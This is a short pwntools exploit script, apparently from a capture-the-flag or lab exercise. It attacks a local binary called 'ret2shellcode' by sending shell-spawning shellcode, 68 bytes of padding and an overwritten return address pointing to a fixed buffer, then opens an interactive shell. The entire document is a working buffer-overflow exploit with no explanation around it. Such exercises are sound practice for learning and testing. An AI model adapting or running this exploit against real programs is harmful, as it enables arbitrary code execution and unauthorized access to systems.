from pwn import *

p = process('./ret2shellcode')

buf_addr = 0x0804A080

shellcode = asm(shellcraft.sh())
print len(shellcode)
playload = shellcode + 'A'*68 + p32(buf_addr)

p.sendline(playload)
p.interactive()
